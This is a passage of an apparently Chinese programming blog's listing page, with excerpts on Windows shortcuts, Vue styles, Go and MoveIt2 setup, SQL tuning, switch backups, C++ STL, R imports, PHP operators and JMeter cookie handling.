		关闭快捷键 快捷键 Alt + F4快捷键 Ctrl + F4 或 Ctrl + W 包括操作系统在内的任何一个软件都带有或多或少的快捷键，给软件的使用带来极大的便利，Windows 系统中就存在几个能快捷关闭应用程序或窗口的快捷键： 快捷键 Alt + F4 Alt+F4 是最常用于关闭当前活动窗口的快捷键。在 Windows 中运行任何程序时，如果按下Alt+F4，将向计算机发出命令以关闭当前活动的程序。例如，如果你现在在计算机浏览器上阅读某页面时按下此快捷键，它将关闭浏览器窗口和所有打开的选项卡。如果没有打开任何程序或处于桌面上，按Alt+F4 将打开关机窗口。
快捷键 Ctrl + F4 或 Ctrl + W Ctrl + W 是最常用于关闭程序、窗口、选项卡或文档的快捷键。
浏览器中的 Ctrl + F4 或 Ctrl + W：在所有主要的互联网浏览器（如 Chrome、Edge、Firefox、Opera）中，按 Ctrl+F4 或 Ctrl + W 关闭当前选项卡。如果没有打开多个选项卡，则按 Ctrl+F4 或 Ctrl + W 关闭浏览器
上图按 Ctrl+F4 或 Ctrl + W 后变为：
Excel 中的 Ctrl + F4 或 Ctrl + W：在 Excel 和其他电子表格程序中，按 Ctrl+F4 或 Ctrl + W 会提示你是否要保存当前工作簿
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7b7e5b2f98377682bff8c45468d29e98/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/371e8104a71eadacba7446e4d56bdace/" rel="bookmark">
			Vue---CSS样式的作用域
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引入方式：在 .vue文件中的style标签中写入样式 打包以后就是全局样式
写一个css文件在项目中引入也是全局样式
如果全局样式出现相同的选择器，先导入的优先级低
举例：
在App.vue中导入tbox.vue文件，再次文件中添加变量msg，并修改msg值得字体颜色时
App.vue文件
&lt;template&gt;
&lt;div class="mainbox"&gt;
&lt;tbos&gt;&lt;/tbos&gt; &lt;/div&gt;
&lt;/template&gt;
&lt;script&gt;
import tbos from "./components/tbos.vue"
export default {
components:{
tbos }
}
&lt;/script&gt;
&lt;style&gt; .p{
color: rgb(226, 43, 52);
}
&lt;/style&gt;
tbox.vue文件
&lt;template&gt;
&lt;p class="p"&gt;{{msg}}&lt;/p&gt;
&lt;/template&gt;
&lt;style&gt;
.p{
color: blue;
}
&lt;/style&gt;
结果：
在App.vue文件中同时也修改其字体颜色时：
App.vue文件
&lt;style&gt; .p{
color: rgb(226, 43, 52);
}
&lt;/style&gt;
结果：（因为App.vue文件中的style标签比tbox.vue文件后运行，所以其样式优先级高于tbox.vue文件中的style样式）
同时在main.js中引入一个css文件时：
main.js文件
import Vue from 'vue'
import App from './App.vue'
import "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/371e8104a71eadacba7446e4d56bdace/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/76cb504373554d56260d00d346d3e004/" rel="bookmark">
			vscode配置Go支持
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 前言一、goproxy的代理设置1.安装go插件2. 配置golang辅助工具 总结附录 前言 由于vscode是开源免费的，而且开发支持vscode的插件相对比较容易，更新速度也很快。
一、goproxy的代理设置 设置GOPROXY代理为阿里云 go env -w GOPROXY=https://mirrors.aliyun.com/goproxy/ powershell指定 $env:GOPROXY = "https://mirrors.aliyun.com/goproxy/" 设置GOPROXY代理商为七牛云 go env -w GOPROXY=https://goproxy.cn powershell指定 $env:GOPROXY="https://goproxy.cn" 里面有个PowerShell (Windows)配置，把PowerShell (Windows)里面的两个配置到环境变量里面
变量名：GOPROXY
变量值：https://goproxy.io,direct
变量名：GOPRIVATE
变量值：git.mycompany.com,github.com/my/private
注意：随着goproxy.io网站的更新，配置可能会改变
二、vscode配置
1.安装go插件 可用快捷键ctrl+shift+x,或者点击下方图片里面的位置，显示出应用商店
搜索关键字"go",基本上第一个就是，进去点击安装
2. 配置golang辅助工具 使用快捷键：Ctrl+Shift+P 输入Go:Install/Update Tools，选择全都要，但是注意，会安装失败！这一步目前没什么用，看看就行。
重启VSCode，再来一次Ctrl+Shift+P 输入Go:Install/Update Tools的操作就可以正常安装go工具了，不用快捷键也可以，进去后VSCode会提示让我们安装，直接安装所有就行，安装的依赖包会自动保存在刚才创建的Go/pkg里面，以后写代码配置的依赖包都会下载在pkg文件夹里面，所以前面不建议默认配置在c盘，还是改成其他盘好点。
总结 附录 源代码: https://gitee.com/gene-zhao/fyne-demo.git
更多高级用法，持续更新...
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cd83f605174ff2afab7912eea6a152bb/" rel="bookmark">
			SQL优化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.确认是否建立索引，是否索引失效 原则：没有索引考虑加索引，有索引先看索引建立的是否合理以及尽量避免索引失效
1.1.如果不是业务需要查询所有字段，避免直接select*
原因：
完全没有走覆盖索引的可能
有可能索引失效
增加了数据传输的开销
...
1.2.避免在where子句中对有索引的字段进行null值判断
前提：
mysql v5.7
在height上建立了普通索引
现象：
用null值判断，索引失效
不用null值判断，走索引
1.3其他索引失效的情况
2.limit 1优化 limit 1的作用：只返回一条记录，即使有多条也忽略其他只返回第一条。
前提：如果我们已经知道得到的数据永远仅仅只有一条的话，那就可以加上 LIMIT 1，进行优化．
现象：
SELECT * FROM regions WHERE region_name LIKE "%北京市%" region_name表中有70万条数据．
没加 limit 1
加 limit 1
原因：
如果没有加 LIMIT 1 的话，数据库会在找到符合条件的记录以后继续向下查询，继续寻找另一个符合条件的记录，直到最后一条数据．如果我们已经知道得到的数据永远仅仅只有一条的话，那就可以加上 LIMIT 1，让数据库找到一条数据之后就立刻返回结果，这样就大大提升了性能！
参考
3.insert 优化 3.1将多条单独的insert语句改为批量一次性插入
INSERTINTO`insert_table`(`datetime`,`uid`,`content`,`type`)VALUES('0','userid_0','content_0',0); INSERTINTO`insert_table`(`datetime`,`uid`,`content`,`type`)VALUES('1','userid_1','content_1',1); //修改成： INSERTINTO`insert_table`(`datetime`,`uid`,`content`,`type`)VALUES('0','userid_0','content_0',0), ('1','userid_1','content_1',1); 原因：
减少SQL语句解析的操作,只需要解析一次就能进行数据的插入操作．
SQL语句较短,可以减少网络传输的IO．
3.2将多条insert语句放到一个事务中，并手动提交
STARTTRANSACTION; INSERTINTO`insert_table`(`datetime`,`uid`,`content`,`type`)VALUES('0','userid_0','content_0',0); INSERTINTO`insert_table`(`datetime`,`uid`,`content`,`type`)VALUES('1','userid_1','content_1',1); ... COMMIT; 原因：
进行一个INSERT操作时,MySQL内部会建立一个事物,在事物内进行真正插入处理,通过使用自动提交事物可以减少创建事物的消耗,所有插入都在执行后才进行提交操作. 参考：http://seo.wordc.cn/contentlp.asp?id=1040
4.update优化 innodb引擎使用update时,会有行锁/表锁两种模式, 如果where 字段没有索引的时候会升级成表锁.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cd83f605174ff2afab7912eea6a152bb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2952ca1741675b12cffaf40fe0199a3d/" rel="bookmark">
			react从18降级到17
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 直接替换react和react-dom npm install react@17.x react-dom@17.x --save 更改index.js 直接粘贴代码替换就行
import React from "react"; import ReactDOM from "react-dom"; import "./index.css"; import App from "./App"; ReactDOM.render(&lt;App /&gt;, document.getElementById("root")); 最后再把没必要的文件删除 src和public有很多自带的文件和logo，可以直接删了。
完成 接下来就可以直接运行了。
npm start 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/295245b1e7884a8f2f2823db42a318aa/" rel="bookmark">
			uniapp退出关闭当前小程序或APP
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用场景：进入小程序/APP有隐私协议，点击不同意隐私协议退出小程序/APP
一、退出当前小程序 &lt;navigator open-type="exit" target="miniProgram"&gt;退出&lt;/navigator&gt; 二、小程序由APP跳转而来，点击按钮退回APP &lt;button open-type="launchApp" app-parameter="wechat" binderror="launchAppError"&gt;退出&lt;/button&gt; navigator 页面跳转。
该组件类似HTML中的&lt; a &gt;组件，但只能跳转本地页面。目标页面必须在pages.json中注册。
属性：
属性名类型默认值说明平台差异说明urlString-应用内的跳转链接，值为相对路径或绝对路径，如：“…/first/first”，“/pages/first/first”，注意不能加 .vue 后缀-open-typeStringnavigate跳转方式-deltaNumber-当 open-type 为 ‘navigateBack’ 时有效，表示回退的层数-animation-typeStringpop-in/out当 open-type 为 navigate、navigateBack 时有效，窗口的显示/关闭动画效果Appanimation-durationNumber300当 open-type 为 navigate、navigateBack 时有效，窗口显示/关闭动画的持续时间。Apphover-classStringnavigator-hover指定点击时的样式类，当hover-class="none"时，没有点击态效果-hover-stop-propagationBooleanfalse指定是否阻止本节点的祖先节点出现点击态微信小程序hover-start-timeNumber50按住后多久出现点击态，单位毫秒-hover-stay-timeNumber600手指松开后点击态保留时间，单位毫秒-targetStringself在哪个小程序目标上发生跳转，默认当前小程序，值域self/miniProgram微信2.0.7+、百度2.5.2+、QQ open-type 有效值
值说明平台差异说明navigate对应 uni.navigateTo 的功能-redirect对应 uni.redirectTo 的功能-switchTab对应 uni.switchTab 的功能-reLaunch对应 uni.reLaunch 的功能字节跳动小程序与飞书小程序不支持navigateBack对应 uni.navigateBack 的功能-exit退出小程序，target="miniProgram"时生效微信2.1.0+、百度2.5.2+、QQ1.4.7+ 官方文档：https://uniapp.dcloud.net.cn/component/navigator.html#navigator
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8a17c34660f6b314824550e068186544/" rel="bookmark">
			moveit2安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.安装Vmware 16 Vmvare官方下载链接：VMware Workstation Player - My VMware
2.安装Ubuntu22.04+ros2humble 下载地址：Index of /ubuntu-releases/22.04/ (ustc.edu.cn)，点开上面的网址
ubuntu-22.04-desktop-amd64.iso 下载
参考：2.在虚拟机中安装Ubuntu (fishros.com)
3.安装Vmware tool 虚拟机界面 点击重新安装vmware tool，会出现安装包，解压压缩包，进入文件夹
su sudo ./vmware-install.pl 一路看到yes就改成yes，后面一个No
sudo apt-get autoremove open-vm-tools sudo apt-get install open-vm-tools sudo apt-get install open-vm-tools-desktop 参考：Ubuntu虚拟机实现与主机之间复制粘贴_一只小学鸡s的博客-CSDN博客_ubuntu虚拟机复制粘贴
安装好之后重启ubuntu系统，可以看到界面匹配，可以与主机之间复制粘贴
4.安装moveit2 首先明确之前的安装环境：ubuntu22.04+ros2humble
参考：https://mp.weixin.qq.com/s/NwovrOzSm5Cj778baPYfdg
下载源码 sudo apt-get install git git clone https://github.com/ros-planning/moveit2.git moveit2_ws/src/moveit2 连不上github，换个
git clone https://ghproxy.com/https://github.com/ros-planning/moveit2.git moveit2_ws/src/moveit2 下载完成后你应该可以在moveit2_ws/src/moveit2文件夹下看到很多个功能包，代表下载成功
安装依赖 还是上面小鱼那个，拿来就用。选3
cd moveit2_ws/ rosdepc install --from-path src --ignore-src -r -y 编译源码 cd moveit2_ws/ colcon build --cmake-args -DCMAKE_BUILD_TYPE=Release Source 在moveit2_ws下
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8a17c34660f6b314824550e068186544/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/756dd98e0868ab95da8b5999482fb37b/" rel="bookmark">
			实训五：交换机配置文件备份
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、实验目的
1、了解什么是交换机的备份。
2、了解TFTP服务器的用法及备份命令。
3、了解TFTP服务器和FTP服务器使用的不同场所。
4、了解什么叫文件上传。
二、应用环境
1、对交换机做好相应的配置以后，明智的管理员会把运行稳定的配置文件和系统文件从交换机里“copy”出来并保存在稳妥的地方，防止日后如果交换机出现了故障导致配置文件丢失的情况出现，有了保存的配置文件和系统文件，当交换机清空之后，可以直接把备份文件下载到交换机上，避免重新配置的麻烦。
2、TFTP（Trivial File Transfer Protocol）/FTP（File Transfer Protocol）都是文件传输协议，在 TCP/IP 协议族中处于第四层，即属于应用层协议，主要用于主机之间、主机与交换机
之间传输文件。它们都采用客户机-服务器模式进行文件传输。
3、TFTP 承载在 UDP 之上，提供不可靠的数据流传输服务，同时也不提供用户认证机制以及根据用户权限提供对文件操作授权；它是通过发送包文，应答方式，加上超时重传方式来保证数据的正确传输。TFTP 相对于 FTP 的优点是提供简单的、开销不大的文件传输服务。
4、 FTP 承载于 TCP 之上，提供可靠的面向连接数据流的传输服务，但它不提供文件存取授权，以
及简单的认证机制（通过明文传输用户名和密码来实现证）。FTP 在进行文件传输时，客户机和服务器之间要建立两个连接：控制连接和数据连接。首先由 FTP 客户机发出传送请求，与服务器的21 号端口建立控制连接，通过控制连接来协商数据连接。
5、由此可见，两种方式不同的特点有其不同的应用环境，局域网内备份和升级可以采用TFTP 方式，广域网中备份和升级则最好使用 FTP 方式。
三、实验设备
1、神州数码DCN-CS6200交换机 1 台
2、PC机 1 台
3、console线 1 根
4、直通网线 1 根
四、实验拓扑
五、实验要求
1、按照拓扑图将电脑连接交换机。
2、PC和交换机的1口用网线连接。
3、交换机的管理ip为192.168.1.1/24
4、PC网卡的ip地址为192.168.1.10/24
六、实验步骤
第一步：配置TFTP服务器。
市场上TFTP服务器的软件有很多，每种软件虽然界面不同，但功能都一样，使用方法也都类似，首先TFTP软件安装，安装完毕之后设定根目录，需要使用的时候，开启TFTP服务器即可。
下图是市面上比较流行的几款服务器： 我们以第一种TFTP服务器为例，“Tftpd32.Exe ”非常简单易学，它甚至不需要安装就能使用（后两个需要安装）
双击Tftpd32.Exe，出现TFTP服务器的主页面：
在主页面中我们可以看到服务器的根目录是D：\TFTP服务器，服务器的ip地址也会自动出现在第二行，点击后面的“Browse”可以更改根目录。
第二步：给交换机设置ip地址即管理地址。
CS6200-28X-EI(config)#int vlan 1 CS6200-28X-EI(config-if-vlan1)#ip add 192.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/756dd98e0868ab95da8b5999482fb37b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8760bd8af4c95061b6d0ee2aadb21cdb/" rel="bookmark">
			JAVA中解决输入数据不符合规则问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在编写代码程序运行的过程中，我们难免有很多时候需要手动输入数据，但只要需要输入数据就可能出现数据不符合规范的问题（即使我们提醒过用户该如何输入数据），但如果不小心输入错误输入就可能会导致整个程序报错而停止运行，当遇到这种问题时确实会让人头疼。
为了解决这个问题从而提高程序的健壮性，我们需要找到解决办法，不能放任不管，那我用的比较简单的方法就是trycatch语句：
public static int Input(int num){//输入数据并能处理不符合规则的数据，提高程序的健壮性 while(true){ try{num=s.nextInt(); return num; }catch (Exception e){ System.out.println("输入格式错误，请重新输入"); s=new Scanner(System.in); } } } 将可能出现问题的代码放入Try语句中，再将可能出现问题放入catch()内，这里使用的是 Exception是因为其是一个大类，内部包含了许多子类，用其可以解决较多问题，但我们这里会出现的问题一般的是数据输入不符合规则的问题，也可以使用InputMismatchException，然后在catch(){}大括号内写上处理该问题的代码。我这里使用的是while循环来处理该问题，若输入一直不符合规则则一直运行并提示错误。最后只需要在测试类中使用即可：
int a=Input(a);
import java.util.Arrays; import java.util.Scanner; public class Practice { static Scanner s = new Scanner(System.in); public static void main(String[] args) { int x=0; x = Input(x); System.out.println(x); } public static int Input(int num) {//输入数据并能处理不符合规则的数据，提高程序的健壮性 while (true) { try { num = s.nextInt(); return num; } catch (Exception e) { System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8760bd8af4c95061b6d0ee2aadb21cdb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/81892424e9ebfd823ad55993e0e469a9/" rel="bookmark">
			为你的阿里云服务器配置一个域名并成功访问（入门版
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、获取域名 可在阿里云域名市场购买，链接
请注意：购买域名需要等待一定的时间，因此最好提前购买。
二、配置域名 1.点击阿里云主页左上角菜单，找到“域名”项，或直接搜索也可。
点击进入域名列表
若是在阿里云官方购买的域名，则在列表中会直接显示，若在其他平台购买的域名则需要手动添加域名。
5.进入域名列表后，跳转到如下界面， 点击解析
6.点击添加记录
7.进行解析设置
8.完成后便会有记录了，建议重启一下，然后直接访问你的域名就可以访问成功了。
9.如果显示站点建立成功或下面这个页面，那么域名解析这部分内容基本上完成。10.要对根域名进行网络备案，不然进不去你的站点。
这也是为什么我的站点时而进得去时而进不去的原因。
备案教程后续再写——因为我还没学会。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3a7f1d49d5c217522a7dae9d1060ef4e/" rel="bookmark">
			【C&#43;&#43;11】C&#43;&#43; STL（面试复习整理-2.0）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1、六大组件介绍
2、容器
顺序容器
vector
list
deque
三、关联容器
map
四、set
适配器
stack
queue &amp; priority_queue
3、红黑树为底层的容器及红黑树
红黑树为底层的容器
红黑树
hash表为底层的容器及hash表
hash表为底层的容器
hash表冲突解决
六、各个容器的使用场景
1、六大组件介绍 STL六大组件
容器：数据结构，用来存放数据
算法：常用算法
迭代器：容器和算法之间的胶合剂，“范型指针”
仿函数：一种重载了operator()的类，使得这个类的使用看上去像一个函数
配置器：为容器分配并管理内存
适配器：修改其他组件接口 （stack、queue、qriority_queue）
2、容器 顺序容器 vector 底层为数组，支持随机访问，节点大小是动态的，支持下标访问。随机存取效率很高（O(1)），插入效率不高。
扩容原理：以原大小的两倍配置一份新空间，将原空间数据拷贝过来，会导致迭代器失效
常用函数
size()：当前vector元素个数
capacity()：vector已分配空间容量
reserve()：预分配空间,分配空间小于现有空间，不改变空间容量
resize()：改变size大小，不改变容量大小
#include&lt;iostream&gt; #include &lt;stdlib.h&gt; #include &lt;time.h&gt; #include&lt;vector&gt; using namespace std; void Push(vector&lt;int&gt; &amp;vec,int i){ vec.push_back(i); cout&lt;&lt;"vector放入"&lt;&lt;i&lt;&lt;"个元素时"&lt;&lt;endl; cout&lt;&lt;"vec.size()="&lt;&lt;vec.size()&lt;&lt;"	vec.capacity()="&lt;&lt;vec.capacity()&lt;&lt;endl; } int main(){ vector&lt;int&gt; vec; cout&lt;&lt;"vector未放入元素时"&lt;&lt;endl; cout&lt;&lt;"vec.size()="&lt;&lt;vec.size()&lt;&lt;"	vec.capacity()="&lt;&lt;vec.capacity()&lt;&lt;endl; for(int i=1;i&lt;4;i++){ Push(vec,i); } cout&lt;&lt;"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3a7f1d49d5c217522a7dae9d1060ef4e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/10f552c57be092fd3e8272cf06750b9c/" rel="bookmark">
			酒店管理系统/基于ssm的酒店管理系统/基于javaweb的酒店管理系统的设计与实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		摘 要
酒店管理系统采用B/S模式，促进了酒店管理的安全、高效、快捷的发展。传统的管理模式还处于手工处理阶段，管理效率极低，随着用户的不断增多，传统基于手工管理模式已经无法满足当前用户需求，随着信息化时代的到来，使得酒店管理系统的开发成了必然。
本网站系统使用动态网页开发Java作为系统的开发语言，MySQL作为后台数据库。设计开发了具有管理员；个人中心、用户管理、酒店信息管理、房间类型管理、酒店预约管理、酒店登记管理、我的收藏管理、系统管理，用户；首页、个人中心、酒店预约管理、我的收藏管理，前台首页；首页、酒店信息、酒店资讯、个人中心、后台管理等功能的酒店管理系统。在设计过程中，充分保证了系统代码的良好可读性、实用性、易扩展性、通用性、便于后期维护、操作方便以及页面简洁等特点。
关键词：酒店管理系统；B/S模式；java语言； Abstract
Hotel management system adopts B / S mode, which promotes the safe, efficient and rapid development of hotel management. The traditional management mode is still in the stage of manual processing, and the management efficiency is very low. With the increasing number of users, the traditional manual management mode has been unable to meet the needs of current users. With the advent of the information age, the development of hotel management system has become inevitable.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/10f552c57be092fd3e8272cf06750b9c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/94dce910d5fb67dd8125e151df44cb58/" rel="bookmark">
			Qt 使用openssl库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在windows下面，QT开发使用ssl库一开始总会有些问题，这里记录一下最近解决的找不到库的经过。
安装QT时如果选择了支持openssl，那么qt就会编译一个版本的openssl库，通常会放在几个地方，这里就不多说了，在安装目录找一找就是。
然后自己下载了openssl的最新版本，最新版本有3.0和1.1.1q，目前没有听说qt已经支持3.0，所以只下了1.1.1q，按照文档编译之后，生成几个文件：实际上qt自己差不多也是用的同样文件名的几个文件，之所以不使用qt自带的库，是懒得一个个找了，而且也不确定自己的程序能用。
这几个文件怎么处理呢？可以都放到项目目录中，当然可以建一个子目录，比方说lib，然后把这些文件都复制到这个目录里边。
相应的，在pro文件中加上LIBS += -L./lib -lssl -lcrypto，编译是没有问题的。
部署的时候用工具来处理库的依赖问题，就不多说了。
这里想说的是，在运行的时候，程序一定要能够找得到上面图片里边的这几个文件，不论是在系统环境变量中设置PATH，还是放到程序工作目录中。在开发的时候如果发现找不到库，那么可以把这些文件复制一份到release或者debug目录中，如果不打算或者不能修改环境变量的话。
总结一下，就是开发的时候，这些文件要存在于项目目录中，并且要在pro文件里设置好相应的参量，以确保编译通过。然而为了能够运行，还需要在编译生成文件的目标目录中也放一份，或者通过设置环境变量来确保程序可以找得到这些文件。
最后，最近偶然发现，windows平台下面使用mingw或者mingw64编译的库的时候，可以去msys2package找一找，有惊喜啊。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e66a893e0e7b67dc8c39afeff5888c9c/" rel="bookmark">
			如何用R导入外部数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		data&lt;-read.csv(file.choose())
1."data.csv" 保存在 Rstudio 工作目录中。
直接使用:
read.table("data.csv")
如果excel文件数据有标题，则加上header属性：read.table("data.csv",header=TRUE)
此处，TRUE也可用T代替,sep属性也长用到。
这里csv文件是逗号分割read.table("data.csv",header=T,sep=",")
2."data.csv"不是保存在工作目录，
比如在桌面:"C:\Users\Administrator\Desktop"。
只需要把路径添加进去就可以了。
read.table("C:\\\Users\\Administrator\\\Desktop\\\data.csv",header=TRUE,sep=",")
需要注意的是位置中的""在R和Rstudio中需要用"/"或"\\"表示
3.用file.choose()选择数据文件。
read.table(file.choose(),header=T)
可以弹出对话框选择文件。
这种方法很方便。
4.从内存直接读写数据(剪贴板 clipboard)
复制需要读取的内容。
read.table("clipboard")
可用于临时性的分析工作。
与read.table()用法类似的还有read.csv()
read.csv()的默认语法规则为:read.csv(file,header=TRUE,sep=","",...)
其默认header=TRUE。
例子：有如下表格，命名为n1.csv
输入：read.table("D:\\RStudio\\R_pr\\n1.csv",header=T,row.name="Fname",sep=",")
header=TRUE，第一行为变量名的逻辑型变量
sep = ","，各个字符之间以空格间隔
row.names="Fistname"，Fistname被默认为行名，不再有标签
如果n1.csv的文本文件中空格为缺失值，读入后用“NA”表示
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7ec9706e75062b3603f4b5008b845798/" rel="bookmark">
			AndroidX抽屉布局
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		抽屉布局(DrawerLayout) 本项目所需要用到的依赖
implementation 'androidx.drawerlayout:drawerlayout:1.0.0' 布局文件
&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;androidx.drawerlayout.widget.DrawerLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" xmlns:tools="http://schemas.android.com/tools" android:layout_width="match_parent" android:layout_height="match_parent" tools:context=".MainActivity" android:id="@+id/drawerLayout"&gt; &lt;LinearLayout android:layout_height="match_parent" android:layout_width="match_parent" android:gravity="center"&gt; &lt;Button android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="Button" android:id="@+id/activity_mainButton"/&gt; &lt;/LinearLayout&gt; &lt;LinearLayout android:layout_height="match_parent" android:layout_width="match_parent" android:layout_gravity="left" android:background="#ffffff"&gt; &lt;Button android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="Button" android:id="@+id/activity_mainButton1"/&gt; &lt;/LinearLayout&gt; &lt;/androidx.drawerlayout.widget.DrawerLayout&gt; 代码部分
import android.app.Activity; import android.os.Bundle; import android.view.View; import android.widget.Button; import androidx.drawerlayout.widget.DrawerLayout; import android.view.Gravity; import android.widget.Toast; public class MainActivity extends Activity { private Button bt1,bt2; private androidx.drawerlayout.widget.DrawerLayout ct1; @Override protected void onCreate(Bundle savedInstanceState) { super.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7ec9706e75062b3603f4b5008b845798/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bf0222af7c73c4c9d22bef40e90fa194/" rel="bookmark">
			PHP中=＞和-＞有什么区别？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大多数情况下，新的 PHP 开发人员会在程序中对 -&gt; 和 =&gt; 的使用感到困惑。他们想知道两者之间有什么区别，以及各自在程序中的作用和应用。
在本文中，我将详细解释 -&gt; 和 =&gt; 运算符之间的区别，并借助多个代码示例演示它们各自的适用范围。
在我们深入探讨它们的区别和应用之前，让我们首先检查它们的共同点。
他们都是运算符。
运算符是告诉编译器或解释器执行特定操作的符号，例如算术计算、两个值的比较、将值分配给变量/常量或对象的遍历等。
PHP 中的 =&gt; 是什么？ 这称为双箭头运算符。它是用于创建关联数组的赋值运算符。
它位于数组键和它的值之间。它为键（左侧引号中的内容）分配右侧内容的值。
句法
"key" =&gt; value 例子
"name" =&gt; "John" 从上面的示例中，可以为键指定任何名称，但必须用引号括起来（单引号或双引号）。根据其数据类型，右侧的值可能用引号括起来，也可能不括起来。例如，您不必将整数或布尔值括起来，但必须将字符串括起来。
您可以将值直接放入，也可以将其存储在变量或常量中，然后将其分配给键。
键值对用逗号 ( , )相互分隔，但您不要在最后一对之后放置逗号。
示例 1
&lt;?php $person = array( "firstName" =&gt; "John", "lastName" =&gt; "Doe", "age" =&gt; 28, "gender" =&gt; "Male", "email" =&gt; "johndoe@gmail.com", "city" =&gt; "Germany" ); ?&gt; 复制 示例 2
您还可以使用方括号( [ ] )形成上述数组，如下所示：
&lt;?php $person = [ "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bf0222af7c73c4c9d22bef40e90fa194/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/185401e5b0f8722bb9d974b42d055e2f/" rel="bookmark">
			Jmeter接口测试实战-Cookies
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		场景:
接口测试时常都需要登录,请求方式(post), 登录常用的方法有通过获取token, 获取session, 获取cookie, 等等. 这几种都有一个共同的特点, 有效期(expires).
Session是建立连接后session有效, 断开连接session失效, token有效期是服务端控制, cookie是用户浏览访问时被创建的,由服务器发送给客户端使用, 有效期长短和服务器相关, 不同的web服务器默认值略有差异, 在一个临时会话周期内,cookie一般不会被持久化, 也就是关闭浏览器或者退出登录cookie失效.
如何获取token, 我们之前的推文(Jmeter接口测试-正则表达式)里已经介绍过, 今天来讲cookie, 使用cookie既然有有效期,那退出或者其他情况使cookie失效了, 在接口测试脚本中要一直去修改为最新的cookie, 不是很恼人的一件事情吗? 有没有办法一劳永逸呢, 答案是肯定的.
实战:
还是从实例入手, 首先我们找一个已经跑通的接口(原先cookie获取是在自定义变量里写死cookie值, 然后再传给cookie manager), 在结果树的请求-&gt;request Body中查找信息
从图中可以看出, cookie data有几个信息组成
username
SESSION
SERVERID
那这些信息去哪里获取呢?
使用chrome的开发者工具查看, 在application标签下很容易就能找到上述信息
有了以上这些信息,那接下来的事情就好办了, 两种方式添加
1. http cookie manager(推荐)
2. http 信息管理器
在cookie 管理中添加需要存储的cookie
然后把原先用自定义变量里的cookie值删除(写死的cookie值), 用这个方法去获取cookie给同域名下的其他API使用, 即可非常轻松的执行需要登录的API, 细心的同学会发现 cookie data里还有username和SESSION 怎么没用到, 我这个实例中这两个不用也可以正常执行, 如果有需要自行加上即可, 至此有趣的cookie可一劳永逸的使用, 不必再为cookie过期而烦恼了, 不知道你学会了没有, 在实际测试场景中,类似这样的问题时常困扰着我们, 如何巧妙的使用方法去解决(偷懒法则), 学会偷懒的技术工程师才是一个合格的工程师. 一、jmeter的http cookies管理器使用 作用：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/185401e5b0f8722bb9d974b42d055e2f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
